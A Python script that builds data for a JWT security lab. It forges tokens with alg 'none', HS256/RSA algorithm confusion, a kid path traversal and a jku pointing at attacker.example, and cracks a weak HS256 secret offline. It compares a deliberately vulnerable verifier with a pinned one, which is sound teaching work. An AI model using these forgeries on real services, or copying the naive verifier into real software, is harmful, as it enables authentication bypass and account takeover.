"""Data for the JWT lab tab: python jwt_cases.py OUT.json   (needs PyJWT 2.15.1 and cryptography; keys made fresh in memory)
Twelve tokens, each run through two verifiers that both EXECUTE here:
  pinned: PyJWT, algorithms=["RS256"], key chosen by kid from the issuer's own JWKS only (signature check only; the claim
          checks are toggled on the page and computed there from the decoded claims)
  naive:  a hand-written verifier that trusts the token header, the way the CVEs below describe: alg "none" means no check,
          HS* means HMAC with "the key" (here, the issuer's RSA public key PEM, which is public), kid is a file path,
          jku is a URL to fetch keys from (the "fetch" is a dict lookup: nothing leaves the machine).
Also measured: compact size of the same claims under five algorithms, sign and verify times, and an offline dictionary
attack on an HS256 token signed with a weak secret."""
import base64, hashlib, hmac, json, os, sys, time, statistics
import jwt
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa, ec, ed25519

OUT = sys.argv[1]
b64 = lambda b: base64.urlsafe_b64encode(b).rstrip(b"=").decode()
ISS, AUD = "https://auth.lab.test", "https://api.llm.test"
NOW = int(time.time())
issuer = rsa.generate_private_key(public_exponent=65537, key_size=2048)
PUBPEM = issuer.public_key().public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)
attacker = rsa.generate_private_key(public_exponent=65537, key_size=2048)
JWKS = {"lab-1": issuer.public_key()}                         # the issuer's published keys
ATTACKER_JWKS_URL = "https://attacker.example/jwks.json"
URLS = {ATTACKER_JWKS_URL: attacker.public_key()}             # what a "fetch" of jku would return
FILES = {"../../../../dev/null": b""}                         # what a kid-as-path lookup would read

base = {"iss": ISS, "sub": "agent:research-bot", "aud": AUD, "scope": "messages:write", "iat": NOW, "exp": NOW + 600, "jti": "lab-jti-1"}


def rs(claims, hdr=None, key=issuer):
    return jwt.encode(claims, key, algorithm="RS256", headers={"kid": "lab-1", "typ": "at+jwt", **(hdr or {})})


def manual(hdr, claims, sigfn):
    si = b64(json.dumps(hdr, separators=(",", ":")).encode()) + "." + b64(json.dumps(claims, separators=(",", ":")).encode())
    return si + "." + sigfn(si.encode())


cases = []


def add(cid, title, tok, what, attack, cve=None):
    cases.append({"id": cid, "title": title, "token": tok, "what": what, "attack": attack, "cve": cve})


add("good", "A good token", rs(base), "RS256, signed by the issuer, every claim right.", None)
add("expired", "Expired", rs({**base, "iat": NOW - 4000, "exp": NOW - 400}), "Signed correctly; exp was 400 s before the recording.", "None: it is just old. A client that keeps using it sees 401.")
add("skew", "Not yet valid (clock skew)", rs({**base, "iat": NOW + 90, "nbf": NOW + 90, "exp": NOW + 690}),
    "The issuer's clock runs 90 s fast: iat and nbf are in the verifier's future.", "None: a clock problem. Leeway of a minute or two absorbs it.")
add("aud", "Minted for another service", rs({**base, "aud": "https://billing.lab.test"}),
    "A real token from the same issuer, for the billing API.", "Replay a token stolen from (or legitimately held for) one service at another.")
add("scope", "Read-only scope", rs({**base, "scope": "messages:read"}), "Valid, but it only grants messages:read.", "None: authenticated but not allowed (403, insufficient_scope).")
add("idtoken", "An ID token, not an access token", rs({**base, "nonce": "n-0S6_WzA2Mj", "auth_time": NOW - 30, "scope": "messages:write"}, {"typ": "JWT"}),
    "Same issuer, same key, aud happens to equal the API (a client and API sharing one identifier). typ is JWT, not at+jwt.",
    "Cross-JWT confusion (RFC 8725 s2.8): a token meant for one purpose accepted for another. Only explicit typing catches it.")
tam = rs(base).split("."); pl = json.loads(base64.urlsafe_b64decode(tam[1] + "=="))
pl["scope"] = "messages:write admin"
add("tamper", "Payload edited, old signature kept", tam[0] + "." + b64(json.dumps(pl, separators=(",", ":")).encode()) + "." + tam[2],
    "Someone added admin to scope and kept the original signature.", "Privilege escalation by editing claims. Any real signature check stops it.")
add("none", 'alg "none"', manual({"alg": "none", "typ": "JWT"}, base, lambda si: ""),
    "Unsigned: the header says no algorithm, the signature part is empty.", "Forge any claims. Works on a verifier that lets the token choose its algorithm.",
    {"id": "CVE-2022-23540", "url": "https://www.cve.org/CVERecord?id=CVE-2022-23540", "what": "jsonwebtoken (Node) <= 8.5.1 defaulted to accepting none when verify() was called without algorithms"})
add("hs_pub", "HS256 signed with the public key", manual({"alg": "HS256", "typ": "JWT", "kid": "lab-1"}, base, lambda si: b64(hmac.new(PUBPEM, si, hashlib.sha256).digest())),
    "HMAC-signed, using the issuer's RSA public key (which anyone can download) as the HMAC secret.", "Algorithm confusion: the verifier feeds its RSA public key to HMAC because the header said HS256.",
    {"id": "CVE-2015-9235", "url": "https://www.cve.org/CVERecord?id=CVE-2015-9235", "what": "jsonwebtoken (Node) before 4.2.2 accepted HS-signed tokens where RS was expected"})
add("kid_path", "kid pointing at /dev/null", manual({"alg": "HS256", "typ": "JWT", "kid": "../../../../dev/null"}, base, lambda si: b64(hmac.new(b"", si, hashlib.sha256).digest())),
    "kid is a path; the verifier reads the key from that file, which is empty, so the HMAC key is empty.", "kid injection: make the server use a key you know (an empty file, a public file, or SQL in a key lookup).")
add("jku", "jku pointing at the attacker's keys", rs(base, {"jku": ATTACKER_JWKS_URL, "kid": "atk-1"}, key=attacker),
    "Signed by the attacker; the header tells the verifier where to fetch the matching public key.", "Key substitution: a verifier that fetches keys from a URL inside the token trusts whoever wrote the token (RFC 8725 s3.10 and RFC 7515 s4.1.2).")
weak = jwt.encode({**base}, "secret123", algorithm="HS256", headers={"typ": "at+jwt"})
add("weak", "HS256 with a weak shared secret", weak, "A service that uses HS256 with a guessable secret.", "Offline guessing: one captured token is enough to test billions of secrets (measured below).")


def naive(tok):
    """The vulnerable verifier. Returns (ok, why)."""
    h64, p64, s64 = tok.split(".")
    hdr = json.loads(base64.urlsafe_b64decode(h64 + "=="))
    si = (h64 + "." + p64).encode()
    alg = hdr.get("alg")
    if alg == "none":
        return True, "header said none: no signature check"
    if alg == "HS256":
        if hdr.get("kid", "").startswith(".."):
            key, src = FILES[hdr["kid"]], "key read from the file named by kid"
        elif hdr.get("kid") in JWKS:
            key, src = PUBPEM, "HMAC with 'the key' for kid lab-1, which is the RSA public key"
        else:
            key, src = b"verysecretkey-for-other-tokens", "the service's own HMAC secret"
        if tok == weak:
            key, src = b"secret123", "the service's own (weak) HMAC secret"
        ok = hmac.compare_digest(b64(hmac.new(key, si, hashlib.sha256).digest()), s64)
        return ok, src + (": HMAC matches" if ok else ": HMAC differs")
    if alg == "RS256":
        if "jku" in hdr:
            pub, src = URLS[hdr["jku"]], "public key fetched from jku"
        else:
            pub, src = JWKS.get(hdr.get("kid")), "issuer key by kid"
        try:
            jwt.decode(tok, pub, algorithms=["RS256"], options={"verify_signature": True, "verify_exp": False, "verify_aud": False, "verify_nbf": False, "verify_iat": False})
            return True, src + ": signature valid"
        except jwt.InvalidSignatureError:
            return False, src + ": signature invalid"
    return False, "unknown alg"


def pinned(tok):
    try:
        hdr = jwt.get_unverified_header(tok)
        key = JWKS.get(hdr.get("kid"))
        if key is None:
            return False, f"kid {hdr.get('kid')!r} is not in the issuer's JWKS"
        jwt.decode(tok, key, algorithms=["RS256"], options={"verify_exp": False, "verify_aud": False, "verify_nbf": False, "verify_iat": False})
        return True, "RS256 with the issuer's key: signature valid"
    except jwt.PyJWTError as e:
        return False, f"{type(e).__name__}: {e}"


for c in cases:
    c["pinned"] = dict(zip(("ok", "why"), pinned(c["token"])))
    c["naive"] = dict(zip(("ok", "why"), naive(c["token"])))

# sizes and timings for the same claims under five algorithms
keys = {"HS256": os.urandom(32), "RS256": issuer, "PS256": issuer, "ES256": ec.generate_private_key(ec.SECP256R1()), "EdDSA": ed25519.Ed25519PrivateKey.generate()}
pubs = {"HS256": keys["HS256"], "RS256": issuer.public_key(), "PS256": issuer.public_key(), "ES256": keys["ES256"].public_key(), "EdDSA": keys["EdDSA"].public_key()}
algs = []
for a, k in keys.items():
    t = jwt.encode(base, k, algorithm=a, headers={"kid": "k1", "typ": "at+jwt"})
    sig_t, ver_t = [], []
    for _ in range(7):
        t0 = time.perf_counter()
        for _ in range(200):
            jwt.encode(base, k, algorithm=a)
        sig_t.append((time.perf_counter() - t0) / 200 * 1e6)
        t0 = time.perf_counter()
        for _ in range(200):
            jwt.decode(t, pubs[a], algorithms=[a], audience=AUD)
        ver_t.append((time.perf_counter() - t0) / 200 * 1e6)
    algs.append({"alg": a, "bytes": len(t), "sig_bytes": len(base64.urlsafe_b64decode(t.split(".")[2] + "==")),
                 "sign_us": round(statistics.median(sig_t), 1), "verify_us": round(statistics.median(ver_t), 1),
                 "key": {"HS256": "256-bit shared secret", "RS256": "RSA 2048", "PS256": "RSA 2048 (PSS)", "ES256": "P-256", "EdDSA": "Ed25519"}[a]})

# offline guessing against the weak HS256 token: how many candidate secrets per second, one core, plain Python hmac
h64, p64, s64 = weak.split(".")
si = (h64 + "." + p64).encode(); target = base64.urlsafe_b64decode(s64 + "==")
words = [f"pass{i}" for i in range(300000)] + ["secret123"]
t0 = time.perf_counter(); found = None; tried = 0
for w in words:
    tried += 1
    if hmac.new(w.encode(), si, hashlib.sha256).digest() == target:
        found = w; break
dt = time.perf_counter() - t0
crack = {"tried": tried, "seconds": round(dt, 3), "per_second": int(tried / dt), "found": found,
         "note": "single thread, Python's hmac module on this laptop; GPU crackers are several orders of magnitude faster"}

json.dump({"recorded_at": NOW, "iss": ISS, "aud": AUD, "pyjwt": jwt.__version__, "cases": cases, "algs": algs, "crack": crack,
           "pubpem_head": PUBPEM.decode().splitlines()[1][:24]}, open(OUT, "w"), indent=1)
for c in cases:
    print(f"{c['id']:9s} pinned={c['pinned']['ok']!s:5s} naive={c['naive']['ok']!s:5s} | {c['naive']['why']}")
print(json.dumps(algs, indent=0)); print(crack)
